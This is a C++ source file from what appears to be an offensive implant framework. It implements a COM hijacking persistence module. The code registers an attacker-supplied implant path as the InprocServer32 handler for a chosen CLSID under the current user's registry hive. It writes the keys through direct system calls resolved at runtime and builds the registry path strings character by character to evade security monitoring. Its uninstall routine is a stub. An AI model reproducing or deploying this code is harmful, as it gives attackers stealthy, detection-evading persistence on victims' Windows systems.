#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include <iostream>
#include <sddl.h>
#pragma comment(lib, "advapi32.lib")

#define NT_SUCCESS(status) (((NTSTATUS)(status)) >= 0)

extern "C" void RtlInitUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString);

namespace {
std::wstring GetCurrentUserSid() {
    HANDLE hToken;
    OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    DWORD dwLength = 0;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &dwLength);
    PTOKEN_USER pTokenUser = (PTOKEN_USER) new BYTE[dwLength];
    GetTokenInformation(hToken, TokenUser, pTokenUser, dwLength, &dwLength);
    CloseHandle(hToken);
    LPWSTR sidString;
    ConvertSidToStringSidW(pTokenUser->User.Sid, &sidString);
    std::wstring result(sidString);
    LocalFree(sidString);
    delete[] pTokenUser;
    return result;
}
}

namespace persistence {

bool ComHijacker::Install(const std::string& implantPath, const std::string& clsid) {
    evasion::SyscallResolver& res = evasion::SyscallResolver::GetInstance();
    DWORD ntCreateKeySsn = res.GetServiceNumber("NtCreateKey");
    DWORD ntSetValueKeySsn = res.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = res.GetServiceNumber("NtClose");
    if (ntCreateKeySsn == 0xFFFFFFFF) return false;

    wchar_t softwareClassesClsid[] = { L'S', L'o', L'f', L't', L'w', L'a', L'r', L'e', L'\\', L'C', L'l', L'a', L's', L's', L'e', L's', L'\\', L'C', L'L', L'S', L'I', L'D', L'\\', 0 };
    std::wstring wClsid(clsid.begin(), clsid.end());
    wchar_t inprocServer32[] = { L'\\', L'I', L'n', L'p', L'r', L'o', L'c', L'S', L'e', L'r', L'v', L'e', L'r', L'3', L'2', 0 };
    std::wstring wSubkey = std::wstring(softwareClassesClsid) + wClsid + std::wstring(inprocServer32);
    
    UNICODE_STRING keyUni;
    RtlInitUnicodeString(&keyUni, (L"\\Registry\\User\\" + GetCurrentUserSid() + L"\\" + wSubkey).c_str());

    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &keyUni, 0, NULL, NULL);

    HANDLE hKey;
    NTSTATUS status = InternalDoSyscall(ntCreateKeySsn, &hKey, KEY_WRITE, &attr, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
    if (!NT_SUCCESS(status)) return false;

    // Set default (implantPath)
    UNICODE_STRING valName = {0, 0, NULL};
    std::wstring wPath(implantPath.begin(), implantPath.end());
    status = InternalDoSyscall(ntSetValueKeySsn, hKey, &valName, 0, REG_SZ, (PVOID)wPath.c_str(), (ULONG)((wPath.size() + 1) * 2));
    if (!NT_SUCCESS(status)) {
        InternalDoSyscall(ntCloseSsn, hKey);
        return false;
    }

    // Set ThreadingModel
    std::wstring threading = L"Both";
    UNICODE_STRING tmName;
    RtlInitUnicodeString(&tmName, L"ThreadingModel");
    status = InternalDoSyscall(ntSetValueKeySsn, hKey, &tmName, 0, REG_SZ, (PVOID)threading.c_str(), (ULONG)((threading.size() + 1) * 2));

    InternalDoSyscall(ntCloseSsn, hKey);
    return NT_SUCCESS(status);
}

bool ComHijacker::Uninstall(const std::string& /*clsid*/) {
    // TODO: Implement the uninstall logic.
    // Syscall for NtDeleteKey is more complex. Stubbing for now.
    return true;
}

} // namespace persistence
